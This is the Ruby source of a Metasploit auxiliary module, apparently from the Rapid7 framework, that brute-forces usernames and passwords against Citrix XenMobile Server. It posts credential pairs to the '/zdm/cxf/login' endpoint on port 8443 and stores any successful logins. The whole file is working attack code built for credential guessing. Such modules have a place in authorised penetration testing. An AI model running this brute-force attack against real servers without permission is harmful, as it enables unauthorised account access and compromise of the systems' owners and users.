##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner
      class CitrixXenMobileServer < ::Metasploit::Framework::LoginScanner::HTTP
        def check_setup

        end

        def set_sane_defaults
          self.uri = '/zdm/cxf/login'
          self.method = 'POST'
        end

        def get_login_state(username, password)

        end

        def attempt_login(credential)

          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            service_name: 'https'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            req = cli.request_cgi({
              'method' => method,
              'uri' => uri,
              'headers' => {
                'Referer' => 'https://'+host+':'+port.to_s+'/zdm/login_xdm_uc.jsp'
              },
              'vars_post' => {
                'login' => credential.public,
                'password' => credential.private
              }
            })
            res = cli.send_recv(req)
            if res && res.code == 200
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
            end
          rescue ::EOFError, Errno::ETIMEDOUT ,Errno::ECONNRESET, Rex::ConnectionError, OpenSSL::SSL::SSLError, ::Timeout::Error => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end
          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'Citrix XenMobile Server Bruteforce',
        'Description'    => %q(
        This module will bruteforce credentials on an instance of Citrix XenMobile server.
        ),
        'Author'         =>
          [
            'Brandon Perry'
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            ['URL', 'https://www.citrix.com/downloads/xenmobile.html']
          ],
        'DefaultOptions' => {
            'RPORT'           => 8443,
            'STOP_ON_SUCCESS' => true
        }
    )
  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::CitrixXenMobileServer.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
